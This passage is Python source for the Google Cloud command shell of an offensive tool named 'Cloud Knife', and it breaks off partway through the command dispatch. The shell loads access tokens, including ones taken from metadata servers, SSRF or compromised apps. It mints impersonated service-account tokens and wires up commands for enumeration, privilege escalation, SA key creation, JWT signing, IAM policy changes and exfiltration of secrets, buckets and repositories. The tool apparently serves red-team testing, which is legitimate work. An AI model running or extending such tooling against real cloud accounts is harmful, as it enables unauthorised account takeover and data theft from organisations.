#!/usr/bin/env python3
"""
GCP CLI for Cloud Knife.

Provides an interactive REPL for GCP operations with session management,
enumeration, exfiltration, and exploitation capabilities.
"""

import subprocess

from rich.console import Console
from rich.prompt import Prompt, Confirm
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style
from prompt_toolkit.formatted_text import HTML

from src.core.icons import icons
from .gcp_session import GCPSessionManager
from .gcp_ui import (
    print_banner,
    show_sessions_table,
    ask_initial_session_choice,
    show_prompt_status,
    print_help,
)

from .modules.enumeration import (
    enumerate_compute_instances,
    describe_instance,
    enumerate_compute_metadata,
    show_metadata_detail,
    enumerate_storage_buckets,
    enumerate_bucket_objects,
    enumerate_iam_policies,
    get_service_account_iam_policy,
    describe_role,
    list_predefined_roles,
    bruteforce_permissions,
    show_privilege_escalation_paths,
    enumerate_cloud_functions,
    enumerate_cloud_run_services,
    describe_cloud_run_service,
    enumerate_cloud_build_triggers,
    enumerate_cloud_build_history,
    describe_cloud_build,
    enumerate_cloud_sql,
    enumerate_parameters,
    enumerate_exploitable_sas,
    enumerate_delegation_chains,
    enumerate_resource_permissions,
    enumerate_secrets,
    enumerate_source_repositories,
    enumerate_artifact_repositories,
    enumerate_artifact_packages,
    enumerate_artifact_versions,
    quick_enum,
    enumerate_drive_files,
    search_drive_files,
    list_shared_files,
    describe_file_permissions,
    download_file,
    download_files_batch,
)

from .modules.exfiltration import (
    clone_all_source_repositories,
    clone_source_repository,
    download_object,
    download_all_objects,
    exfil_parameters,
    exfil_single_parameter,
    exfil_secrets,
    exfil_single_secret,
    download_artifact,
)

from .modules.lateral_movement import (
    map_impersonation_graph,
    find_delegation_chains,
    impersonate_service_account,
    generate_access_token,
    generate_token_curl_command,
    # SA key creation
    create_sa_key,
    list_sa_keys,
    delete_sa_key,
    # JWT signing
    sign_jwt,
    sign_jwt_for_access_token,
    sign_blob,
    sign_jwt_batch,
    # SA IAM policy manipulation
    get_sa_iam_policy,
    set_sa_iam_policy,
    remove_sa_iam_binding,
    # JWT impersonation
    generate_signed_jwt,
    exchange_jwt_for_token,
    impersonate_with_jwt,
    show_jwt_templates,
    apply_template,
)

from ...logging import get_command_logger
from .search import search_modules as search_gcp_modules

console = Console()
logger = get_command_logger()

# PERF-007: Completer cache to avoid rebuilding on every prompt
_cached_completer = None
_cached_session_names = set()

style = Style.from_dict({
    "badge": "bold purple",
    "prompt": "bold green",
    "session": "bold cyan",
})


def _log_command(session_mgr: GCPSessionManager, command: str, status: str = "executed") -> None:
    """Helper to log GCP commands."""
    if logger.should_log_command(command):
        logger.log_command(
            cloud="gcp",
            session_id=session_mgr.session_id or "unknown",
            session_name=session_mgr.current_session or "unknown",
            command=command,
            status=status,
        )


def build_completer(session_mgr: GCPSessionManager, force_rebuild: bool = False) -> WordCompleter:
    """
    Build autocomplete for GCP commands.

    Args:
        session_mgr: Session manager
        force_rebuild: Force rebuild even if cache is valid

    Returns:
        WordCompleter with cached commands if session names haven't changed
    """
    global _cached_completer, _cached_session_names

    # Get current session names
    sessions = session_mgr.list_sessions()
    current_session_names = {s["name"] for s in sessions}

    # PERF-007: Use cached completer if session names haven't changed
    if not force_rebuild and _cached_completer and current_session_names == _cached_session_names:
        return _cached_completer

    # Rebuild completer
    commands = [
        # General
        "help", "?", "search", "exit", "quit",
        "cloud", "cloud aws", "cloud azure", "cloud gcp",
        # Session/credential management
        "set_credentials", "set_adc", "set_token", "set_token_file",
        "token_info", "set_project", "set_projects",
        "set_zones", "show_config",
        "list_sessions", "use_session", "delete_session", "new_session",
        "clear_sessions",
        "whoami", "discover_projects",
        # Enumeration
        "quick_enum",
        "enumerate_compute", "describe_instance", "enumerate_compute_metadata", "show_metadata_detail",
        "enumerate_storage", "enumerate_iam", "enumerate_sql",
        "enumerate_functions", "enumerate_run_services", "describe_cloud_run_service",
        "enumerate_build_triggers", "enumerate_build_history", "describe_cloud_build",
        "enumerate_objects", "enumerate_parameters",
        "enumerate_exploitable_sas", "enumerate_delegation_chains",
        "enumerate_resource_permissions", "enumerate_secrets", "enumerate_source_repos",
        "enumerate_artifacts", "enumerate_artifact_packages", "enumerate_artifact_versions",
        "enumerate_drive", "search_drive", "list_shared_drive", "describe_drive_file",
        "download_drive_file", "download_drive_files",
        "who_can_impersonate", "describe_role", "list_roles",
        "bruteforce_permissions", "privesc_paths",
        # Lateral Movement
        "map_impersonation", "find_chains", "impersonate", "gen_token_curl",
        "create_sa_key", "list_sa_keys", "delete_sa_key",
        "sign_jwt", "sign_blob", "sign_jwt_batch",
        "get_sa_iam_policy", "set_sa_iam_policy", "remove_sa_iam_binding",
        "impersonate_jwt", "generate_jwt", "exchange_jwt", "show_jwt_templates",
        # Exfiltration
        "clone_source_repo", "clone_all_source_repos",
        "download_object", "exfil_bucket", "exfil_parameters", "exfil_parameter",
        "exfil_secrets", "exfil_secret", "download_artifact",
        # Passthrough
        "gcloud", "gsutil",
    ]

    # Add session names for autocomplete
    for s in sessions:
        commands.append(s["name"])

    # Update cache
    _cached_completer = WordCompleter(commands, ignore_case=True)
    _cached_session_names = current_session_names

    return _cached_completer


def run_gcloud_from_shell(raw_cmd: str, session_mgr: GCPSessionManager) -> None:
    """
    Execute a gcloud CLI command.

    Uses the appropriate credentials based on auth method:
    - Service account: GOOGLE_APPLICATION_CREDENTIALS env var
    - ADC: Uses default credentials
    - Access token: Creates temp file and uses --access-token-file
    """
    import shlex
    import tempfile

    raw_cmd = raw_cmd.strip()
    if not raw_cmd or not raw_cmd.startswith("gcloud"):
        console.print("[yellow]Use: gcloud ... (this wrapper is only for gcloud CLI commands).[/yellow]")
        return

    # Check if credentials are configured
    auth_method = session_mgr.current_session_data.get("auth_method")
    sa_file = session_mgr.current_session_data.get("service_account_file")
    access_token = session_mgr.current_session_data.get("access_token")
    project = session_mgr.current_session_data.get("project_id")
    impersonated_sa = session_mgr.current_session_data.get("impersonated_sa")

    if not auth_method:
        console.print("[red]No credentials configured. Use 'set_credentials', 'set_adc', or 'set_token' first.[/red]")
        return

    # Build environment for gcloud
    import os
    env = os.environ.copy()
    temp_token_file = None
    token_to_use = None

    if auth_method == "service_account" and sa_file:
        # For service accounts, we need to get a fresh token from the credentials
        try:
            credentials = session_mgr.get_credentials()
            if credentials:
                from google.auth.transport.requests import Request
                credentials.refresh(Request())
                token_to_use = credentials.token
        except Exception as e:
            console.print(f"[yellow]Warning: Could not get token from service account: {e}[/yellow]")
            console.print("[dim]Falling back to GOOGLE_APPLICATION_CREDENTIALS env var[/dim]")
            env["GOOGLE_APPLICATION_CREDENTIALS"] = sa_file

    elif auth_method == "adc":
        # For ADC, get the token from session credentials
        try:
            credentials = session_mgr.get_credentials()
            if credentials:
                from google.auth.transport.requests import Request
                if not credentials.valid:
                    credentials.refresh(Request())
                token_to_use = credentials.token
        except Exception as e:
            console.print(f"[red]Could not get token from ADC: {e}[/red]")
            console.print("[yellow]gcloud will use system default credentials[/yellow]")

    elif auth_method == "access_token" and access_token:
        token_to_use = access_token

    # If we have a token, write it to a temp file and inject --access-token-file
    if token_to_use:
        # Create temp file with restrictive permissions for the access token
        fd, temp_token_path = tempfile.mkstemp(suffix='.txt')
        temp_token_file = os.fdopen(fd, 'w')
        temp_token_file.write(token_to_use)
        temp_token_file.close()
        os.chmod(temp_token_path, 0o600)
        temp_token_file = type('TempFile', (), {'name': temp_token_path})()

        # Inject --access-token-file if not already specified
        if "--access-token-file" not in raw_cmd:
            parts = raw_cmd.split(maxsplit=1)
            if len(parts) > 1:
                raw_cmd = f"{parts[0]} --access-token-file={temp_token_file.name} {parts[1]}"
            else:
                raw_cmd = f"{parts[0]} --access-token-file={temp_token_file.name}"

    if project:
        # Inject --project if not already specified
        if "--project" not in raw_cmd and "-project" not in raw_cmd:
            # Insert project after 'gcloud'
            parts = raw_cmd.split(maxsplit=1)
            if len(parts) > 1:
                raw_cmd = f"{parts[0]} --project={project} {parts[1]}"

    if impersonated_sa:
        # When impersonating, generate an access token with full cloud-platform scope
        # instead of using --impersonate-service-account (which has limited default scopes)
        # This fixes access to APIs like Source Repositories that require specific scopes
        if "--impersonate-service-account" not in raw_cmd:
            # If auth_method is access_token, the token is already impersonated
            # (created by the 'impersonate' command), so we don't need to do anything
            if auth_method == "access_token":
                # Token is already impersonated, just use it as-is
                pass
            else:
                # Need to generate impersonated token from service account or ADC credentials
                try:
                    # Get current token to call generateAccessToken API
                    current_token = None
                    if auth_method == "service_account" and sa_file:
                        credentials = session_mgr.get_credentials()
                        if credentials:
                            from google.auth.transport.requests import Request
                            credentials.refresh(Request())
                            current_token = credentials.token
                    elif auth_method == "adc":
                        credentials = session_mgr.get_credentials()
                        if credentials:
                            from google.auth.transport.requests import Request
                            if not credentials.valid:
                                credentials.refresh(Request())
                            current_token = credentials.token

                    if current_token:
                        # Call generateAccessToken API with cloud-platform scope
                        import requests as req
                        api_url = f"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{impersonated_sa}:generateAccessToken"
                        headers = {
                            "Authorization": f"Bearer {current_token}",
                            "Content-Type": "application/json",
                        }
                        body = {
                            "scope": ["https://www.googleapis.com/auth/cloud-platform"],
                            "lifetime": "3600s",
                        }

                        response = req.post(api_url, json=body, headers=headers, timeout=30)
                        if response.status_code == 200:
                            result = response.json()
                            impersonated_token = result.get("accessToken")

                            if impersonated_token:
                                # Override token_to_use with impersonated token
                                token_to_use = impersonated_token

                                # Write impersonated token to temp file (overwrite if exists, or create new)
                                if temp_token_file:
                                    # Overwrite existing token file
                                    with open(temp_token_file.name, 'w') as f:
                                        f.write(token_to_use)
                                else:
                                    # Create new temp file for impersonated token
                                    fd, temp_token_path = tempfile.mkstemp(suffix='.txt')
                                    temp_token_file_fd = os.fdopen(fd, 'w')
                                    temp_token_file_fd.write(token_to_use)
                                    temp_token_file_fd.close()
                                    os.chmod(temp_token_path, 0o600)
                                    temp_token_file = type('TempFile', (), {'name': temp_token_path})()

                                    # Add --access-token-file to command
                                    if "--access-token-file" not in raw_cmd:
                                        parts = raw_cmd.split(maxsplit=1)
                                        if len(parts) > 1:
                                            raw_cmd = f"{parts[0]} --access-token-file={temp_token_file.name} {parts[1]}"
                                        else:
                                            raw_cmd = f"{parts[0]} --access-token-file={temp_token_file.name}"
                        else:
                            # Fallback to --impersonate-service-account if API fails
                            console.print("[dim yellow]Failed to generate impersonated token, using --impersonate-service-account fallback[/dim yellow]")
                            parts = raw_cmd.split(maxsplit=1)
                            if len(parts) > 1:
                                raw_cmd = f"{parts[0]} --impersonate-service-account={impersonated_sa} {parts[1]}"
                            else:
                                raw_cmd = f"{parts[0]} --impersonate-service-account={impersonated_sa}"
                except Exception as e:
                    # Fallback to --impersonate-service-account if anything fails
                    console.print(f"[dim yellow]Error generating impersonated token: {e}[/dim yellow]")
                    parts = raw_cmd.split(maxsplit=1)
                    if len(parts) > 1:
                        raw_cmd = f"{parts[0]} --impersonate-service-account={impersonated_sa} {parts[1]}"
                    else:
                        raw_cmd = f"{parts[0]} --impersonate-service-account={impersonated_sa}"

    try:
        proc = subprocess.Popen(
            shlex.split(raw_cmd),
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        stdout, stderr = proc.communicate()

        if stdout:
            console.print(stdout)
        if stderr:
            console.print(f"[dim]{stderr}[/dim]")

        _log_command(
            session_mgr,
            raw_cmd,
            "executed" if proc.returncode == 0 else f"failed (exit {proc.returncode})",
        )

    except Exception as e:
        console.print(f"[red]Error running gcloud: {e}[/red]")
        _log_command(session_mgr, raw_cmd, f"error: {str(e)}")

    finally:
        # Clean up temp token file if created
        if temp_token_file:
            try:
                os.unlink(temp_token_file.name)
            except Exception:
                pass


def run_gsutil_from_shell(raw_cmd: str, session_mgr: GCPSessionManager) -> None:
    """
    Execute a gsutil CLI command.

    Uses the appropriate credentials based on auth method:
    - Service account: GOOGLE_APPLICATION_CREDENTIALS env var
    - ADC: Uses default credentials
    - Access token: Creates temp file and uses gcloud auth with token
    """
    import shlex
    import tempfile

    raw_cmd = raw_cmd.strip()
    if not raw_cmd or not raw_cmd.startswith("gsutil"):
        console.print("[yellow]Use: gsutil ... (this wrapper is only for gsutil CLI commands).[/yellow]")
        return

    # Check if credentials are configured
    auth_method = session_mgr.current_session_data.get("auth_method")
    sa_file = session_mgr.current_session_data.get("service_account_file")
    access_token = session_mgr.current_session_data.get("access_token")
    project = session_mgr.current_session_data.get("project_id")
    impersonated_sa = session_mgr.current_session_data.get("impersonated_sa")

    if not auth_method:
        console.print("[red]No credentials configured. Use 'set_credentials', 'set_adc', or 'set_token' first.[/red]")
        return

    # Build environment for gsutil
    import os
    env = os.environ.copy()
    token_to_use = None

    if auth_method == "service_account" and sa_file:
        # For service accounts, we need to get a fresh token from the credentials
        try:
            credentials = session_mgr.get_credentials()
            if credentials:
                from google.auth.transport.requests import Request
                credentials.refresh(Request())
                token_to_use = credentials.token
        except Exception as e:
            console.print(f"[yellow]Warning: Could not get token from service account: {e}[/yellow]")
            console.print("[dim]Falling back to GOOGLE_APPLICATION_CREDENTIALS env var[/dim]")
            env["GOOGLE_APPLICATION_CREDENTIALS"] = sa_file

    elif auth_method == "adc":
        # For ADC, get the token from session credentials
        try:
            credentials = session_mgr.get_credentials()
            if credentials:
                from google.auth.transport.requests import Request
                if not credentials.valid:
                    credentials.refresh(Request())
                token_to_use = credentials.token
        except Exception as e:
            console.print(f"[red]Could not get token from ADC: {e}[/red]")
            console.print("[yellow]gsutil will use system default credentials[/yellow]")

    elif auth_method == "access_token" and access_token:
        token_to_use = access_token

    # If we have a token, set it via environment variable
    # gsutil and gcloud respect CLOUDSDK_AUTH_ACCESS_TOKEN without modifying global config
    if token_to_use:
        # Set the access token via environment variable
        # This is session-specific and doesn't affect global gcloud configuration
        env["CLOUDSDK_AUTH_ACCESS_TOKEN"] = token_to_use

    if project:
        # Set CLOUDSDK_CORE_PROJECT for gsutil
        env["CLOUDSDK_CORE_PROJECT"] = project

    if impersonated_sa:
        # Inject -i flag for impersonation if not already specified
        if " -i " not in raw_cmd and not raw_cmd.endswith(" -i"):
            parts = raw_cmd.split(maxsplit=1)
            if len(parts) > 1:
                raw_cmd = f"{parts[0]} -i {impersonated_sa} {parts[1]}"
            else:
                raw_cmd = f"{parts[0]} -i {impersonated_sa}"

    try:
        proc = subprocess.Popen(
            shlex.split(raw_cmd),
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        stdout, stderr = proc.communicate()

        if stdout:
            console.print(stdout)
        if stderr:
            console.print(f"[dim]{stderr}[/dim]")

        _log_command(
            session_mgr,
            raw_cmd,
            "executed" if proc.returncode == 0 else f"failed (exit {proc.returncode})",
        )

    except Exception as e:
        console.print(f"[red]Error running gsutil: {e}[/red]")
        _log_command(session_mgr, raw_cmd, f"error: {str(e)}")


def run_gcp_cli(session_mgr: GCPSessionManager) -> str:
    """
    Main GCP CLI REPL.

    Returns:
        - "exit" to quit Cloud Knife
        - "switch" to return to cloud selector
        - "aws"/"azure"/"gcp" for direct cloud switch
    """
    global _cached_completer, _cached_session_names

    print_banner()

    # Show existing sessions
    existing_sessions = session_mgr.list_sessions()
    show_sessions_table(existing_sessions)

    existing_names = [s["name"] for s in existing_sessions]

    # Ask for session selection
    session_name, is_new = ask_initial_session_choice(bool(existing_sessions), existing_names)

    if is_new:
        session_mgr.create_or_load_session(session_name)
    else:
        if not existing_names:
            session_mgr.create_or_load_session("default")
        else:
            # Loop until valid session name is provided
            available = {s["name"] for s in existing_sessions}
            select_prompt = PromptSession(
                completer=WordCompleter(existing_names, ignore_case=True),
                style=style,
                auto_suggest=AutoSuggestFromHistory(),
            )

            while True:
                try:
                    chosen = select_prompt.prompt(
                        "Existing session name (TAB for autocomplete): ",
                        style=style,
                    )
                    name = chosen.strip()

                    # Validate session exists before loading
                    if name not in available:
                        console.print(f"[red]Session '{name}' not found. Please try again.[/red]")
                        continue

                    session_mgr.create_or_load_session(name)
                    break
                except KeyboardInterrupt:
                    console.print("\n[yellow]Session selection cancelled.[/yellow]")
                    return "exit"

    has_creds = session_mgr.has_credentials()
    show_prompt_status(session_mgr.current_session, has_creds)

    # Build REPL session
    session_prompt = PromptSession(
        completer=build_completer(session_mgr),
        style=style,
        auto_suggest=AutoSuggestFromHistory(),
    )

    GCP_BADGE = f"GCP {icons.gcp}"

    while True:
        try:
            if session_mgr.current_session:
                prompt_text = HTML(
                    f"<badge>{GCP_BADGE}</badge><prompt>cloudknife[<session>{session_mgr.current_session or 'no-session'}</session>]&gt; </prompt>"
                )
            else:
                prompt_text = HTML(f"<badge>{GCP_BADGE}</badge><prompt>cloudknife&gt; </prompt>")

            user_input = session_prompt.prompt(prompt_text, style=style)
            parts = user_input.strip().split()
            if not parts:
                continue
            cmd = parts[0].lower()
            args = parts[1:]

            # Passthrough gcloud CLI
            if cmd == "gcloud":
                run_gcloud_from_shell(user_input, session_mgr)
                continue

            # Passthrough gsutil CLI
            if cmd == "gsutil":
                run_gsutil_from_shell(user_input, session_mgr)
                continue

            # Cloud switching
            if cmd == "cloud":
                if args and args[0].lower() in ("aws", "azure", "gcp"):
                    return args[0].lower()
                return "switch"

            # Exit commands
            if cmd in ("exit", "quit"):
                return "exit"

            # Help
            if cmd in ("help", "?"):
                print_help()

            # Search
            elif cmd == "search":
                query = " ".join(args) if args else None
                search_gcp_modules(session_mgr, query)
                _log_command(session_mgr, cmd)

            # ---------- Credential management ----------

            elif cmd == "set_credentials":
                # Set service account key file - prompt if not provided
                if args:
                    key_file = args[0]
                else:
                    console.print("[bold yellow]🔑 GCP Service Account Credentials[/bold yellow]")
                    key_file = Prompt.ask(
                        "[cyan]Path to service account JSON key file[/cyan]",
                        default="~/.config/gcloud/service-account.json"
                    )

                if session_mgr.set_service_account(key_file):
                    console.print(f"[green]Service account configured successfully.[/green]")
                    console.print(f"[dim]Project: {session_mgr.default_project}[/dim]")
                    console.print(f"[dim]Service Account: {session_mgr.current_session_data.get('service_account_email')}[/dim]")
                else:
                    console.print("[red]Failed to configure service account. Check the key file path and format.[/red]")

            elif cmd == "set_adc":
                # Use Application Default Credentials
                if session_mgr.use_application_default_credentials():
                    console.print("[green]Application Default Credentials configured.[/green]")
                    project = session_mgr.default_project
                    if project:
                        console.print(f"[dim]Project: {project}[/dim]")
                    else:
                        console.print("[yellow]No default project detected. Use 'set_project' to configure one.[/yellow]")
                else:
                    console.print("[red]Failed to configure ADC. Run 'gcloud auth application-default login' first.[/red]")

            elif cmd == "set_token":
                # Set raw access token - prompt if not provided
                # Syntax: set_token <token> [project] [service_account]
                if args:
                    token = args[0]
                    project_id = args[1] if len(args) > 1 else None
                    sa_email = args[2] if len(args) > 2 else None
                else:
                    console.print("[bold yellow]🔑 GCP Access Token[/bold yellow]")
                    console.print("[dim]Token sources: metadata server, SSRF, compromised app, etc.[/dim]")
                    console.print("\n[cyan]Token input method:[/cyan]")
                    console.print("[1] Paste token directly")
                    console.print("[2] Read from file")
                    console.print("[3] From environment variable (GCP_ACCESS_TOKEN)")

                    method = Prompt.ask("[cyan]Choose method[/cyan]", choices=["1", "2", "3"], default="1")

                    if method == "1":
                        token = Prompt.ask("[cyan]Access token[/cyan]")
                    elif method == "2":
                        token_file = Prompt.ask("[cyan]Path to token file[/cyan]", default="/tmp/gcp_token.txt")
                        try:
                            import os
                            with open(os.path.expanduser(token_file), "r") as f:
                                token = f.read().strip()
                            console.print(f"[green]Token read from file ({len(token)} chars)[/green]")
                        except Exception as e:
                            console.print(f"[red]Error reading file: {e}[/red]")
                            continue
                    else:  # method == "3"
                        import os
                        token = os.environ.get("GCP_ACCESS_TOKEN", "").strip()
                        if not token:
                            console.print("[red]GCP_ACCESS_TOKEN environment variable not set[/red]")
                            continue
                        console.print(f"[green]Token read from env var ({len(token)} chars)[/green]")

                    project_id = Prompt.ask("[cyan]Project ID (optional, press Enter to skip)[/cyan]", default="")
                    project_id = project_id if project_id else None
                    sa_email = None  # Will ask later if needed

                # First, try to get identity from tokeninfo
                import requests
                detected_email = None
                try:
                    response = requests.get(
                        "https://oauth2.googleapis.com/tokeninfo",
                        params={"access_token": token},
                        timeout=10,
                    )
                    if response.status_code == 200:
                        token_info = response.json()
                        detected_email = token_info.get("email")
                        expires_in = token_info.get("expires_in")
                        if detected_email:
                            console.print(f"[green]Detected identity: {detected_email}[/green]")
                        if expires_in:
                            console.print(f"[dim]Expires in: {expires_in} seconds[/dim]")
                except Exception:
                    pass

                # If no email detected and not provided, ask user
                if not detected_email and not sa_email:
                    console.print("[yellow]Could not detect identity from token (common for metadata server tokens).[/yellow]")
                    sa_email = Prompt.ask(
                        "[cyan]Service account email (optional, press Enter to skip)[/cyan]",
                        default=""
                    )
                    sa_email = sa_email if sa_email else None

                # Use detected email or user-provided
                final_sa_email = detected_email or sa_email

                if session_mgr.set_access_token(token, project_id, service_account_email=final_sa_email, skip_tokeninfo=True):
                    console.print("[green]Access token configured.[/green]")
                    console.print("[yellow]Note: Access tokens expire (~1 hour) and cannot be refreshed.[/yellow]")
                    if final_sa_email:
                        console.print(f"[dim]Identity: {final_sa_email}[/dim]")
                    if not project_id:
                        console.print("[yellow]Use 'set_project <project-id>' to set a project.[/yellow]")
                else:
                    console.print("[red]Failed to set access token.[/red]")

            elif cmd == "set_token_file":
                # Set access token from file - prompt if not provided
                if args:
                    token_file = args[0]
                    project_id = args[1] if len(args) > 1 else None
                else:
                    console.print("[bold yellow]🔑 GCP Access Token from File[/bold yellow]")
                    token_file = Prompt.ask("[cyan]Path to token file[/cyan]", default="/tmp/gcp_token.txt")
                    project_id = Prompt.ask("[cyan]Project ID (optional, press Enter to skip)[/cyan]", default="")
                    project_id = project_id if project_id else None

                if session_mgr.set_access_token_from_file(token_file, project_id):
                    console.print("[green]Access token configured from file.[/green]")
                    console.print("[yellow]Note: Access tokens expire (~1 hour) and cannot be refreshed.[/yellow]")

                    token_info = session_mgr.get_token_info()
                    if token_info and "error" not in token_info:
                        if token_info.get("email"):
                            console.print(f"[dim]Identity: {token_info.get('email')}[/dim]")
                        if token_info.get("expires_in"):
                            console.print(f"[dim]Expires in: {token_info.get('expires_in')} seconds[/dim]")
                    if not project_id:
                        console.print("[yellow]Use 'set_project <project-id>' to set a project.[/yellow]")
                else:
                    console.print("[red]Failed to read token from file. Check the path.[/red]")

            elif cmd == "token_info":
                # Get information about the current access token
                token_info = session_mgr.get_token_info()
                if not token_info:
                    console.print("[yellow]No token available. Use 'set_token' or 'set_token_file' first.[/yellow]")
                elif "error" in token_info:
                    console.print(f"[red]Token error: {token_info['error']}[/red]")
                else:
                    _display_token_info(token_info)

            elif cmd == "set_project":
                # Set default project - prompt if not provided
                if args:
                    project_id = args[0]
                else:
                    current = session_mgr.default_project
                    console.print("[bold yellow]🎯 Set Default GCP Project[/bold yellow]")
                    if current:
                        console.print(f"[dim]Current: {current}[/dim]")
                    project_id = Prompt.ask("[cyan]Project ID[/cyan]", default=current or "")

                if project_id:
                    session_mgr.set_project(project_id)
                    console.print(f"[green]Default project set to: {project_id}[/green]")
                else:
                    console.print("[yellow]No project ID provided.[/yellow]")

            elif cmd == "set_projects":
                # Set projects list for enumeration - prompt if not provided
                if args:
                    projects_input = args
                else:
                    current = session_mgr.configured_projects
                    console.print("[bold yellow]🌍 Configure Projects for Enumeration[/bold yellow]")
                    console.print(f"[dim]Current: {', '.join(current) if current else '(auto-discover all)'}[/dim]")
                    console.print(
                        "[dim]Examples:\n"
                        "  - 'project-a,project-b' → enumerate only these projects\n"
                        "  - 'all' → auto-discover all accessible projects\n"
                        "  - empty → reset to auto-discover[/dim]"
                    )
                    value = Prompt.ask("[cyan]Projects (comma-separated, 'all' or empty)[/cyan]", default="")
                    projects_input = [p.strip() for p in value.split(",") if p.strip()] if value else []

                if not projects_input or (len(projects_input) == 1 and projects_input[0].lower() == "all"):
                    session_mgr.set_projects([])
                    console.print("[green]Will enumerate all accessible projects.[/green]")
                else:
                    session_mgr.set_projects(projects_input)
                    console.print(f"[green]Projects set: {', '.join(projects_input)}[/green]")

            elif cmd == "set_zones":
                # Set zones list for enumeration - prompt if not provided
                if args:
                    zones_input = args
                else:
                    current = session_mgr.configured_zones
                    console.print("[bold yellow]🌍 Configure Zones for Enumeration[/bold yellow]")
                    console.print(f"[dim]Current: {', '.join(current) if current else '(all zones)'}[/dim]")
                    console.print(
                        "[dim]Examples:\n"
                        "  - 'us-central1-a,us-east1-b' → enumerate only these zones\n"
                        "  - 'all' or empty → enumerate all zones[/dim]"
                    )
                    value = Prompt.ask("[cyan]Zones (comma-separated, 'all' or empty)[/cyan]", default="")
                    zones_input = [z.strip() for z in value.split(",") if z.strip()] if value else ["all"]

                if not zones_input or (len(zones_input) == 1 and zones_input[0].lower() == "all"):
                    session_mgr.set_zones([])
                    console.print("[green]Will enumerate all zones.[/green]")
                else:
                    session_mgr.set_zones(zones_input)
                    console.print(f"[green]Zones set: {', '.join(zones_input)}[/green]")

            elif cmd == "show_config":
                _show_config(session_mgr)

            elif cmd == "whoami":
                _whoami(session_mgr)

            elif cmd == "discover_projects":
                _discover_projects(session_mgr)

            # ---------- Session management ----------

            elif cmd == "list_sessions":
                sessions = session_mgr.list_sessions()
                show_sessions_table(sessions)

            elif cmd == "use_session":
                name = args[0] if args else None
                if not name:
                    sessions = session_mgr.list_sessions()
                    names = [s["name"] for s in sessions]
                    if not names:
                        console.print("[yellow]No sessions available.[/yellow]")
                        continue
                    select_prompt = PromptSession(
                        completer=WordCompleter(names, ignore_case=True),
                        style=style,
                        auto_suggest=AutoSuggestFromHistory(),
                    )
                    chosen = select_prompt.prompt(
                        "Session name (TAB for autocomplete): ",
                        style=style,
                    )
                    name = chosen.strip()
                if name:
                    # Check if session exists before loading
                    available = {s["name"] for s in session_mgr.list_sessions()}
                    if name not in available:
                        console.print(f"[red]Session '{name}' not found.[/red]")
                        continue
                    session_mgr.create_or_load_session(name)
                    console.print(f"[green]Switched to session: {name}[/green]")

            elif cmd == "delete_session":
                name = args[0] if args else None
                if not name:
                    console.print("[yellow]Usage: delete_session <session_name>[/yellow]")
                    continue
                if session_mgr.delete_session(name):
                    console.print(f"[green]Session '{name}' deleted.[/green]")
                    # PERF-007: Invalidate completer cache
                    global _cached_completer, _cached_session_names
                    _cached_completer = None
                    _cached_session_names = set()
                else:
                    console.print("[red]Cannot delete current or only session.[/red]")

            elif cmd == "new_session":
                if not args:
                    console.print("[yellow]Usage: new_session <session_name>[/yellow]")
                    continue
                session_mgr.create_or_load_session(args[0])
                console.print(f"[green]Created and switched to session: {args[0]}[/green]")
                # PERF-007: Invalidate completer cache
                _cached_completer = None
                _cached_session_names = set()

            elif cmd == "clear_sessions":
                sessions = session_mgr.list_sessions()
                session_count = len(sessions)

                console.print(f"\n[bold red]⚠️  WARNING: Delete All Sessions[/bold red]")
                console.print(f"\nYou are about to delete [bold yellow]{session_count}[/bold yellow] session(s):")
                for s in sessions:
                    console.print(f"  • [cyan]{s['name']}[/cyan]")
                console.print(f"\n[bold red]This action will permanently delete all saved credentials and session data.[/bold red]")
                console.print("[dim]This cannot be undone.[/dim]\n")

                if Confirm.ask("[yellow]Are you sure you want to delete all sessions?[/yellow]", default=False):
                    count = session_mgr.delete_all_sessions()
                    console.print(f"\n[green]✓ Deleted {count} session(s).[/green]")
                    # PERF-007: Invalidate completer cache
                    _cached_completer = None
                    _cached_session_names = set()
                else:
                    console.print("\n[yellow]Aborted. No sessions were deleted.[/yellow]")

            # ---------- Enumeration ----------

            elif cmd == "quick_enum":
                # Quick enumeration of key GCP services
                # Usage: quick_enum
                quick_enum(session_mgr)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_compute":
                enumerate_compute_instances(session_mgr)
                _log_command(session_mgr, cmd)

            elif cmd == "describe_instance":
                # Describe a specific compute instance with metadata and startup scripts
                # Usage: describe_instance [instance_name] [project_id] [zone]
                instance_name = args[0] if args else None
                project_id = args[1] if len(args) > 1 else None
                zone = args[2] if len(args) > 2 else None
                describe_instance(session_mgr, instance_name, project_id, zone)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_compute_metadata":
                # Enumerate instance and project metadata
                # Usage: enumerate_compute_metadata
                enumerate_compute_metadata(session_mgr)
                _log_command(session_mgr, cmd)

            elif cmd == "show_metadata_detail":
                # Display detailed metadata value for a specific instance or project
                # Usage: show_metadata_detail [instance_name] [key]
                instance_name = args[0] if args else None
                key = args[1] if len(args) > 1 else None
                show_metadata_detail(session_mgr, instance_name, key)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_storage":
                enumerate_storage_buckets(session_mgr)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_iam":
                enumerate_iam_policies(session_mgr)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_functions":
                # Enumerate Cloud Functions (v1 and v2)
                # Optional arg: generation (v1, v2, all)
                generation = args[0] if args else "all"
                if generation not in ("v1", "v2", "all"):
                    console.print("[yellow]Valid options: v1, v2, all (default)[/yellow]")
                    generation = "all"
                enumerate_cloud_functions(session_mgr, generation)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_run_services":
                # Enumerate Cloud Run services
                # Usage: enumerate_run_services
                enumerate_cloud_run_services(session_mgr)
                _log_command(session_mgr, cmd)

            elif cmd == "describe_cloud_run_service":
                # Describe a specific Cloud Run service with environment variables
                # Usage: describe_cloud_run_service [service_name] [project_id] [region]
                service_name = args[0] if args else None
                project_id = args[1] if len(args) > 1 else None
                region = args[2] if len(args) > 2 else None
                describe_cloud_run_service(session_mgr, service_name, project_id, region)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_build_triggers":
